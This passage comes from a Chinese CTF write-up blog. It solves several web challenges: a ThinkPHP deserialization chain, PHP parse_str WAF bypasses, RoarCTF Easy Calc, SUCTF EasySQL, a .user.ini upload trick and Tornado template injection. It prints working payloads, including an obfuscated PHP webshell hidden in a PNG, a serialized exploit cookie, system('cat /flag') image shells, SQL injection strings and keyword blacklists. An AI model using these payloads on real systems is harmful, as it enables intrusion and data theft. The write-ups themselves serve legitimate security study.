&#x27;echo(&quot;glzjin&quot;);&#x27; # print(var) # eval test payload like: &quot;echo(&quot;asdsa&quot;);&quot; r = session.post(url + file, data=data, params=params) if r.text.find(&#x27;glzjin&#x27;) != -1: mutex.acquire() print(file + &quot; found! method:&#123;&#125;&quot;.format(&quot;eval&quot;)) mutex.release() # assert test payload like &quot;echo(&quot;asdsa&quot;)&quot; for i in params: params[i] = params[i][:-1] for i in data: data[i] = data[i][:-1] r = session.post(url + file, data=data, params=params) if r.text.find(&#x27;glzjin&#x27;) != -1: mutex.acquire() print(file + &quot; found! method:&#123;&#125;&quot;.format(&quot;assert&quot;)) mutex.release() # system test payload like &quot;echo asdsa&quot; for i in params: params[i] = &#x27;echo glzjin&#x27; for i in data: data[i] = &#x27;echo glzjin&#x27; r = session.post(url + file, data=data, params=params) if r.text.find(&#x27;glzjin&#x27;) != -1: mutex.acquire() print(file + &quot; found! method:&#123;&#125;&quot;.format(&quot;system&quot;)) mutex.release() # print(&quot;====================&quot;)for file in files: # 遍历文件夹 if not os.path.isdir(file): # 判断是否是文件夹，不是文件夹才打开 # read_file(file) pool.submit(read_file, file) 1xk0SzyKwfzw.php 后门文件 执行方式是 system 去康康这个文件,四百多行，没有搜索到system，有可能是通过拼接生成的system 12345678910111213&lt;?php$W96 = &#x27;wiMI9l7q&#x27;;$xjGowjMeo = &#x27;NPK&#x27;;$HeMPrLHRrEJ = &#x27;dLEIN&#x27;;$Z_kn8Jvza = new stdClass();$Z_kn8Jvza-&gt;uH = &#x27;VIYdLFk&#x27;;$Z_kn8Jvza-&gt;mY = &#x27;ftPRiyoe9&#x27;;$nGXvwmVD3SW = &#x27;zAfhhrf&#x27;;$qJzeCC = array();$qJzeCC[]= $W96;......?&gt; 看到是在这里拼接了system函数。参数为GET方式传入的Efa5BVG http://05e04639-97d5-46f6-88ce-5992aa75eca9.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag 得到flag:flag&#123;b4ab84c1-b1e7-4b95-bc39-7038df6958b1&#125; Upload 注册登录，扫面一下后台 12345Dir found: /robots.txt - 200Dir found: /.htaccess - 200Dir found: / - 200Dir found: /upload%2F - 200Dir found: /www.tar.gz - 200 下载www.tar.gz 流程分析 thinkphp5.1框架 Register.php里面有一个析构函数，当没有注册的时候跳转到主页面 12345public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; index.php会先进行身份验证login_check 123456789public function index()&#123; if($this-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/home&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; return $this-&gt;fetch(&quot;index&quot;);&#125; login_check: 123456789101112public function login_check()&#123; $profile=cookie(&#x27;user&#x27;); if(!empty($profile))&#123; $this-&gt;profile=unserialize(base64_decode($profile)); $this-&gt;profile_db=db(&#x27;user&#x27;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#x27;ID&#x27;]))-&gt;find(); if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;&#125; login_check中对$this-&gt;profile进行了反序列化操作，并且没有任何安全性检查，所以这里应该是入口点，payload应该放在cookie中。 那么怎么利用呢？ 审计代码没发现有什么函数比如file_get_contents()等，但是这个有上传文件功能，所以看看能不能上传木马。 找到上传文件主要函数:在Profile中upload_img函数 123456789101112131415161718192021222324252627public function upload_img()&#123; if($this-&gt;checker)&#123; if(!$this-&gt;checker-&gt;login_check())&#123; $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;; $this-&gt;redirect($curr_url,302); exit(); &#125; &#125; if(!empty($_FILES))&#123; $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;; $this-&gt;ext_check(); &#125; if($this-&gt;ext) &#123; if(getimagesize($this-&gt;filename_tmp)) &#123; @copy($this-&gt;filename_tmp, $this-&gt;filename); @unlink($this-&gt;filename_tmp); $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;; $this-&gt;update_img(); &#125;else&#123; $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;)); &#125; &#125;else&#123; $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;)); &#125;&#125; 这个函数先进行身份检查， 然后如果上传的文件不为空则将文件名$this-filename命名为md5($_FILES['upload_file']['name']).&quot;.png&quot;;， 然后在经过后缀名检查 $this-&gt;ext_check();因为刚才后缀加了png所以这个检查肯定会通过 把临时文件复制改名为新文件名filename，然后删除临时文件 正常来说由于filename后面被强制加上了png后缀，所以不可能上传php木马，但是加png后缀这一步判断条件是 if(!empty($_FILES))，所以如果我们不上传文件的话也就绕过了这个强制加后缀的过程。 如果我们先上传一个图片马，然后将filename_tmp=图片马路径，filename=xxx.php，经过复制便可达到getshell，所以要想办法在不上传文件的情况下调用upload_img 所以现在主要目的就是利用反序列化构造类来进行调用。 payload链 分析 Register::__destruct()应该是入口函数 12345public function __destruct()&#123; if(!$this-&gt;registed)&#123; $this-&gt;checker-&gt;index(); &#125;&#125; 注意到Profile中还有两个魔术方法: 12345678public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; __call 和 _get 两个魔术方法，分别书写了在调用不可调用方法和不可调用成员变量时怎么做。_get 会直接从 except 里找，_call 会调用自身的 name 成员变量所指代的变量所指代的方法。 如果将Register的checker赋值为Profile对象，则其析构函数中$this-&gt;checker-&gt;index();就变成了Profile-&gt;index(); 而Profile中不存在index()方法，所以__call方法被自动调用，__call方法中的$name=index , $arguments为空, $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);变成了$this-&gt;index(); 而Profile中不存在index()变量，所以__get()方法被自动调用，__get()方法中的$name=index,$this-&gt;except[$name];变成$this-&gt;except['index']; Profile是存在except变量的，如果令except['index']=upload_img,则__get方法返回upload_img，然后_call方法调用upload_img。 最终poc 先上传一个图片马(可以用蚁剑生成) cmd.png, 要加上png图片头格式绕过getimagesize 1234�PNG�&lt;?php // 使用时请删除此行, 连接密码: cmd ?&gt;&lt;?php $PhFE=create_function(chr(714-678).chr(0351-0166).str_rot13(&#x27;b&#x27;).chr(0x193-0x126).chr(0146615/01011),chr(29391/291).chr(0154244/0726).chr(0121517/0657).base64_decode(&#x27;bA==&#x27;).chr(0x3a6-0x37e).str_rot13(&#x27;$&#x27;).chr(0xd3-0x60).chr(360-249).chr(0x3e8-0x37b).chr(0577-0432).base64_decode(&#x27;KQ==&#x27;).chr(0144107/01545));$PhFE(base64_decode(&#x27;NDIxN&#x27;.&#x27;zgzO0&#x27;.&#x27;BldkF&#x27;.&#x27;sKCRf&#x27;.&#x27;&#x27;.chr(582-497).chr(828-759).chr(0x349-0x310).base64_decode(&#x27;VA==&#x27;).str_rot13(&#x27;I&#x27;).&#x27;&#x27;.&#x27;&#x27;.base64_decode(&#x27;Rg==&#x27;).str_rot13(&#x27;g&#x27;).base64_decode(&#x27;ag==&#x27;).chr(0214374/01336).chr(046445/0343).&#x27;&#x27;.&#x27;RdKTs&#x27;.&#x27;xMjY1&#x27;.&#x27;MzQ5O&#x27;.&#x27;w==&#x27;.&#x27;&#x27;));?&gt; 注意命名空间 app\\web\\controller（要不然反序列化会出错，不知道对象实例化的是哪个类） 1234567891011121314151617181920212223242526272829&lt;?phpnamespace app\\web\\controller;class Register&#123; public $checker; public $registed; public function __construct() &#123; //确保进入if $this-&gt;registed = 0; $this-&gt;checker = new Profile(); &#125; &#125;namespace app\\web\\controller;class Profile&#123; public $filename_tmp; public $filename; public $ext; public $except; public function __construct() &#123; $this-&gt;except=[&#x27;index&#x27;=&gt;&#x27;upload_img&#x27;]; $this-&gt;filename_tmp =&quot;./upload/76d9f00467e5ee6abc3ca60892ef304e/45616bece453d246c7edf323262cb9ef.png&quot;; $this-&gt;filename = &quot;./upload/shell.php&quot;; $this-&gt;ext=&quot;png&quot;; &#125;&#125;echo base64_encode(serialize(new Register())); 1TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo0OntzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkLzc2ZDlmMDA0NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzQ1NjE2YmVjZTQ1M2QyNDZjN2VkZjMyMzI2MmNiOWVmLnBuZyI7czo4OiJmaWxlbmFtZSI7czoxODoiLi91cGxvYWQvc2hlbGwucGhwIjtzOjM6ImV4dCI7czozOiJwbmciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7aTowO30= 作为cookie提交，然后蚁剑链接，这里就直接post参数手动找出flag就好了 12345cmd=system(&quot;ls /&quot;);�PNG \u001a bin dev etc flag home lib media mnt opt proc root run sbin srv sys tmp usr var cmd=system(&quot;cat /flag&quot;);�PNG \u001a flag&#123;90f7f851-abec-455a-ac13-229f1cd3cef6&#125; https://www.kancloud.cn/manual/thinkphp5/118048 https://www.zhaoj.in/read-5873.html https://blog.csdn.net/chasingin/article/details/104374416"},{"title":"PHP反序列化及扩展","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/PHP反序列化及扩展/","text":"phar扩展"},{"title":"PHP开启交互模式","date":"2020-02-28","updated":"2024-03-19","path":"2020/02/28/PHP开启交互模式/","text":"php -a代表开启交互模式 需要注意的是，Interactive Shell 和 Interactive Mode 并不是一个东西，尽管名称和功能都很相似。 如果你输入php -a，得到的回应是‘Interactive Shell’并跟随着php&gt;提示符，那你使用的就是交互式shell。如果你得到的回应是Interactive mode enabled，说明你的PHP并不支持交互式shell，上面介绍的用法也不实用于你。 但也不用担心，Interactive mode(交互模式)也可以在命令行窗口里执行PHP代码，只是代码的执行方式有些区别。在PHP交互模式(Interactive mode)里，你在命令行窗口里输入PHP代码，代码不会立即执行，当你输入了所有PHP代码后，输入Ctrl-Z（windows里），或输入Ctrl-D（linux里），你输入的所有代码将会一次执行完成并输出结果。 在PHP交互模式(Interactive mode)里，跟交互式shell里不一样，你的代码需要以&lt;?php开头，跟你的普通PHP文件里的写法一致。下面是在Windows里的使用例子。 12345678C:\\&gt;php -aInteractive mode enabled&lt;?phpecho &quot;Hello, world!&quot;;?&gt;^ZHello, world! 在Windows里，没有交互式shell，只有Interactive mode。 在我恩自己的kali里确实不支持，那就安装readline扩展 123456789root@kali:/var/www/html/CTF/RoarCTF2019/Easy_Calc# php&lt;?php echo &quot;ADSAD&quot;;?&gt;ADSADroot@kali:/var/www/html/CTF/RoarCTF2019/Easy_Calc# php -aInteractive mode enabledphp &gt; 如何使用PHP的交互式运行环境(Interactive shell) 交互模式的开启 php readline安装"},{"title":"PHP参数字符串解析特性","date":"2020-02-27","updated":"2024-03-19","path":"2020/02/27/PHP参数字符串解析特性/","text":"利用PHP的字符串解析特性Bypass ​ 我们知道PHP将查询字符串（在URL或正文中）转换为内部GET或的关联数组_GET或的关联数组G​ET或的关联数组_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id] =&gt; 42)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过： 1/news.php?%20news[id%00=42&quot;+AND+1=0-- ​ 上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。 ​ PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事： ​ 1.删除空白符 ​ 2.将某些字符转换为下划线（包括空格） ​ 例如： User input Decoded PHP variable name %20foo_bar%00 foo_bar foo_bar foo%20bar%00 foo bar foo_bar foo%5bbar foo[bar foo_bar 我们可以使用如下代码，探测哪些字符会被parser_str函数删除或者转换为下划线: 1234567891011121314151617181920212223242526&lt;?php foreach( [ &quot;&#123;chr&#125;foo_bar&quot;, &quot;foo&#123;chr&#125;bar&quot;, &quot;foo_bar&#123;chr&#125;&quot; ] as $k =&gt; $arg) &#123; for($i=0;$i&lt;=255;$i++) &#123; echo &quot;\\033[999D\\033[K\\r&quot;; echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;; parse_str(str_replace(&quot;&#123;chr&#125;&quot;,chr($i),$arg).&quot;=bla&quot;,$o); /* yes... I&#x27;ve added a sleep time on each loop just for the scenic effect :) like that movie with unrealistic brute-force where the password are obtained one byte at a time (∩｀-´)⊃━☆ﾟ.*･｡ﾟ */ usleep(5000); if(isset($o[&quot;foo_bar&quot;])) &#123; echo &quot;\\033[999D\\033[K\\r&quot;; echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;; &#125; &#125; echo &quot;\\033[999D\\033[K\\r&quot;; echo &quot;\\n&quot;; &#125; 在上述方案中，foo%20bar和foo+bar等效，均解析为foo bar。 输入 输出 %20news_id news_id news%20id news_id news%00id news news[id news_id news.id news_id news+id news_id news_id%20 news_id_"},{"title":"RoarCTF2019","date":"2020-02-27","updated":"2024-03-19","path":"2020/02/27/RoarCTF2019/","text":"Easy Calc cacl.php 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET[&#x27;num&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; $str = $_GET[&#x27;num&#x27;]; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $str)) &#123; die(&quot;what are you want to do?&quot;); &#125; &#125; eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);&#125;?&gt; 存在Waf，尝试用php字符串解析特性绕过 php字符串解析特性 输入 输出 %20news_id news_id news%20id news_id news%00id news news[id news_id news.id news_id news+id news_id news_id%20 news_id_ 绕过后发现禁用了一些函数 方法一： 利用一些php的文件操作函数： getcwd — 取得当前工作目录 dirname(string $path) — 返回 path 的父目录 scandir — 列出指定路径中的文件和目录 payload1: chr(47)绕过黑名单中的/,看一下根目录下有啥?%20num=print_r(scandir(chr(47))) 1Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; .dockerenv [3] =&gt; bin [4] =&gt; boot [5] =&gt; dev [6] =&gt; etc [7] =&gt; f1agg [8] =&gt; home [9] =&gt; lib [10] =&gt; lib64 [11] =&gt; media [12] =&gt; mnt [13] =&gt; opt [14] =&gt; proc [15] =&gt; root [16] =&gt; run [17] =&gt; sbin [18] =&gt; srv [19] =&gt; start.sh [20] =&gt; sys [21] =&gt; tmp [22] =&gt; usr [23] =&gt; var ) 1 payload2:? num=var_dump(scandir(dirname(dirname(dirname(getcwd()))))); 在根目录发现flag的位置/f1agg 由于 1$blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;,&#x27;\\$&#x27;,&#x27;\\\\&#x27;,&#x27;\\^&#x27;]; 过滤了/,‘等字符不能够直接var_dump(file_get_contents(’/f1agg’))所以想到了利用编码来绕过。var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))可以得到flag. 方法二： 这个计算器特写向国赛初赛的一道题，这个可以采用国赛拿到题目的做法来做题。 base_convert函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回_ *等特殊字符 123456789echo base_convert(&#x27;system&#x27;,36,10); 1751504350echo base_convert(&#x27;1751504350&#x27;,10,36); systemecho base_convert(&#x27;ls&#x27;,36,10); 784echo base_convert(&#x27;784&#x27;,10,36); ls ? num=base_convert(1751504350,10,36)(base_convert(784,10,36))可以成功执行ls; Easy_ Java fuzz了一下应该是没有注入点，点击help 这里get方式提交只返回这种页面，得用POST方式提交(留个坑以后填)。 测试的时候发现这是tomcat服务器，后台是java编写 所以看一下有没有相关的源码泄漏 12345/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件 确实有/WEB-INF/web.xml ，在里面发现了FlagController这个类，应该是控制flag的，尝试下载， 123456&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;&lt;/servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; 要用tomcat项目存放路径来下载/WEB-INF/classes/com/wm/ctf/FlagController.class strings _WEB-INF_classes_com_wm_ctf_FlagController.class"},{"title":"SUCTF2019","date":"2020-02-26","updated":"2024-03-19","path":"2020/02/26/SUCTF2019/","text":"EasySQL 1、堆叠注入 2、set sql_mode=PIPES_AS_CONCAT;将||视为字符串的连接操作符而非或运算符 3、没有过滤*的时候可以直接注入* 测试过滤词 被过滤的词有: 1union prepare &amp;&amp; or sleep if from... 可用的词: 1select set database mid ascii || , ^ ( ) # show ping 12; benchmark ... 输入1’没什么反应，输入1返回1，猜测是堆叠注入，输入1;select 123;返回Array ( [0] =&gt; 1 ) Array ( [0] =&gt; 123 ) ，嗯~，输入1;select benchmark(50000000,7^5^8);存在延迟。后续测试发现有长度限制，为40。 12345678910111;select database();Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) 1;use ctf;show tables;Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) 1;use ctf;describe Flag;nonono1;use ctf;describe(select(0x466c6167)); --&gt; length=39 发现不了新姿势了，搜搜wp吧。。 EasySQL 简书 MySQL中sql_mode参数 oracle中|| mysql中|| 我见过最短的payload: 1*,0 太amazing了~~ 原来比赛中是有源码泄露的，源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php session_start(); include_once &quot;config.php&quot;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass); if(!$MysqlLink)&#123; die(&quot;Mysql Connect Error!&quot;); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(&quot;Choose Database Error!&quot;); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post[&#x27;query&#x27;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\\&quot;&quot;; //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]))&#123; //echo $post[&#x27;query&#x27;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&#x27;query&#x27;])&gt;40)&#123; die(&quot;Too long.&quot;); &#125; $sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 解法1 11;set sql_mode=PIPES_AS_CONCAT;select 1 设置sql_mode为PIPES_AS_CONCAT后可改变’||'的含义为连接字符串。 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 改变语义后就是将前一个字段的查询结果和后一个字段查询结果进行拼接（类似于字符串的拼接函数Concat）。这样两个字段都会被查询 相当于执行: select 1||flag from Flag 在本地环境测试测试 ||作为逻辑或时: 12345678910111213141516171819202122232425262728293031323334353637383940MariaDB [test]&gt; select @@sql_mode;+-------------------------------------------------------------------------------------------+| @@sql_mode |+-------------------------------------------------------------------------------------------+| STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+-------------------------------------------------------------------------------------------+1 row in set (0.001 sec)MariaDB [test]&gt; SELECT 1 || -1 || 0,1 || &quot;flagasdasd&quot; ,1 || 2,1 || NULL, 0 || NULL, NULL || NULL;+--------------+-------------------+--------+-----------+-----------+--------------+| 1 || -1 || 0 | 1 || &quot;flagasdasd&quot; | 1 || 2 | 1 || NULL | 0 || NULL | NULL || NULL |+--------------+-------------------+--------+-----------+-----------+--------------+| 1 | 1 | 1 | 1 | NULL | NULL |+--------------+-------------------+--------+-----------+-----------+--------------+1 row in set (0.001 sec)MariaDB [test]&gt; select flag from flag;+----------------------------------------+| flag |+----------------------------------------+| D0g3&#123;G0ph1er_4nd_55rf_1s_1nt3rest1ng!&#125; |+----------------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.000 sec)MariaDB [test]&gt; select 1||flag from flag; # 1 || flag 相当于把flag的结果与数字1做或判断，数字||字符串 的结果为1。 相当于 1 or &quot;xxxx&quot; +---------+| 1||flag |+---------+| 1 |+---------+1 row in set (0.002 sec) ||作为连接词时: 123456789101112131415161718MariaDB [test]&gt; set sql_mode=PIPES_AS_CONCAT;Query OK, 0 rows affected (0.002 sec)MariaDB [test]&gt; select @@sql_mode;+-----------------+| @@sql_mode |+-----------------+| PIPES_AS_CONCAT |+-----------------+1 row in set (0.000 sec)MariaDB [test]&gt; select 0||flag from flag;+-----------------------------------------+| 0||flag |+-----------------------------------------+| 0D0g3&#123;G0ph1er_4nd_55rf_1s_1nt3rest1ng!&#125; |+-----------------------------------------+1 row in set (0.001 sec) 解法2 payload：*,1 原sql语句变为 select *,1||flag from Flag 123456789101112131415MariaDB [test]&gt; select @@sql_mode;+-------------------------------------------------------------------------------------------+| @@sql_mode |+-------------------------------------------------------------------------------------------+| STRICT_TRANS_TABLES,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+-------------------------------------------------------------------------------------------+1 row in set (0.000 sec)MariaDB [test]&gt; select *,1||flag from flag;+----------------------------------------+---------+| flag | 1||flag |+----------------------------------------+---------+| D0g3&#123;G0ph1er_4nd_55rf_1s_1nt3rest1ng!&#125; | 1 |+----------------------------------------+---------+1 row in set (0.000 sec) CheckIn .user.ini 首先我们来看一下题目，首页就是一个简单的上传界面： 我们先上传一个php文件试一下，显然是illegal的 经过fuzz发现修改content-type和利用特殊扩展名php5、pht等都没有成功（当然也不会这么简单233） 然后我们把扩展名改为aaa试一下会怎样，发现回显：&lt;? in contents!，那么就是说文件内容不能包含`喽，但我们此时知道它是黑名单过滤了。 我们再把文件内容换一下，发现回显：exif_imagetype:not image!，猜测后端应该调用了php的exif_imagetype()函数，这个很好绕过，添加图片文件头就可以了 我们添加最简单的gif文件头GIF89a，发现上传成功（注意看该文件夹下还有一个index.php，当时没有注意，但在后面有大用处） 我们先来捋一下思路： -&gt; 上传过滤为黑名单，但php脚本文件应该是无法上传的 -&gt; 存在文件头过滤，需要添加图片文件的文件头 -&gt; 文件的内容不能包含`，但可以上传&lt;scirpt&gt;类型的图片马来绕过 既然是黑名单过滤而且可以上传图片马，那我们首先想到的肯定是传一个.htaccess上去来将图片马解析为php，而这种方法经过尝试发现失败了。。。 看了一下服务器是nginx 1.10.3，似乎版本较高，不存在解析漏洞。 随后在网上看到了一篇p牛的文章，讲的是利用.user.ini来上传php后门 我们可以上传一个这样的.user.ini： 12GIF89aauto_prepend_file=a.jpg 此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那这简直暴露了考点就是.user.ini，看来这个思路应该是可行的 然后再上传一个这样的图片马a.jpg： 12GIF89a&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt; 最后，我们访问http://192.168.177.152:9021/uploads/6683eb5bfa1174bd139499256f60b7ab/index.php 即可得到flag"},{"title":"2018护网杯","date":"2020-02-25","updated":"2024-03-19","path":"2020/02/25/2018护网杯/","text":"这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）; flag文件名题目已给出 /fllllllllllag 题目关键为如何获取cookie，在Bp抓包的情况下没有显示cookie，由于是python的一个模板，首先想到的就是模板注入&#123;&#123;&#125;&#125;，最终找到的位置是报错网页（随便访问一个文件是更改它的签名就可以进入），里面的参数msg 1http://117.78.27.209:32354/error?msg=%E7%AD%BE%E5%90%8D%E9%94%99%E8%AF%AF 该处将原有参数替换可以执行模板注入msg=，需要注意，这里过滤了大多数奇怪的字符，并且跟以往的题目不同的是，这里不需要python的基类再寻找子函数，而是直接获取环境的变量。 该思想来源于题目的提示render，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，简单的理解例子如下： 12345678910#!/usr/bin/env python# -*- coding:utf-8 -*-from tornado.web import UIModulefrom tornado import escape class custom(UIModule): def render(self, *args, **kwargs): return escape.xhtml_escape(&#x27;&lt;h1&gt;wupeiqi&lt;/h1&gt;&#x27;) #return escape.xhtml_escape(&#x27;&lt;h1&gt;wupeiqi&lt;/h1&gt;&#x27;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python# -*- coding:utf-8 -*- import tornado.ioloopimport tornado.web class MainHandler(tornado.web.RequestHandler): def get(self): self.render(&#x27;index.html&#x27;) class LoginHandler(BaseHandler): def get(self): &#x27;&#x27;&#x27; 当用户访登录的时候我们就得给他写cookie了,但是这里没有写在哪里写了呢? 在哪里呢?之前写的Handler都是继承的RequestHandler,这次继承的是BaseHandler是自己写的Handler 继承自己的类,在类了加扩展initialize! 在这里我们可以在这里做获取用户cookie或者写cookie都可以在这里做 &#x27;&#x27;&#x27; &#x27;&#x27;&#x27; 我们知道LoginHandler对象就是self,我们可不可以self.set_cookie()可不可以self.get_cookie() &#x27;&#x27;&#x27; # self.set_cookie() # self.get_cookie() self.render(&#x27;login.html&#x27;, **&#123;&#x27;status&#x27;: &#x27;&#x27;&#125;) def login(request): #获取用户输入 login_form = AccountForm.LoginForm(request.POST) if request.method == &#x27;POST&#x27;: #判断用户输入是否合法 if login_form.is_valid():#如果用户输入是合法的 username = request.POST.get(&#x27;username&#x27;) password = request.POST.get(&#x27;password&#x27;) if models.UserInfo.objects.get(username=username) and models.UserInfo.objects.get(username=username).password == password: request.session[&#x27;auth_user&#x27;] = username return redirect(&#x27;/index/&#x27;) else: return render(request,&#x27;account/login.html&#x27;,&#123;&#x27;model&#x27;: login_form,&#x27;backend_autherror&#x27;:&#x27;用户名或密码错误&#x27;&#125;) else: error_msg = login_form.errors.as_data() return render(request,&#x27;account/login.html&#x27;,&#123;&#x27;model&#x27;: login_form,&#x27;errors&#x27;:error_msg&#125;) # 如果登录成功，写入session，跳转index return render(request, &#x27;account/login.html&#x27;, &#123;&#x27;model&#x27;: login_form&#125;) 我们大概可以看出来，render是一个类似模板的东西，可以使用不同的参数来访问网页。那么我们在进行该题目的操作时，其实参数也是传递过来的，那么是什么参数呢。 在tornado模板中，存在一些可以访问的快速对象，例如 123&lt;title&gt; &#123;&#123; escape(handler.settings[&quot;cookie&quot;]) &#125;&#125;&lt;/title&gt; 黑翼天使23的博客园日志可知， handler 指向RequestHandler 而RequestHandler.settings又指向self.application.settings 所有handler.settings就指向RequestHandler.application.settings了！ 大概就是说，这里面就是我们一下环境变量，我们正是从这里获取的cookie_secret 输入/error?msg=&#123;&#123;handler.settings&#125;&#125;获取到cookie_secret 215aabc9-e591-438c-b2c3-8d64b939a61b 然后计算一下hash值 123456789101112131415161718import hashlib def md5value(s): md5 = hashlib.md5() md5.update(s) return md5.hexdigest() def mdfive2(): filename = &#x27;/fllllllllllag&#x27; aaa =&quot;215aabc9-e591-438c-b2c3-8d64b939a61b&quot; print(md5value(filename)) # 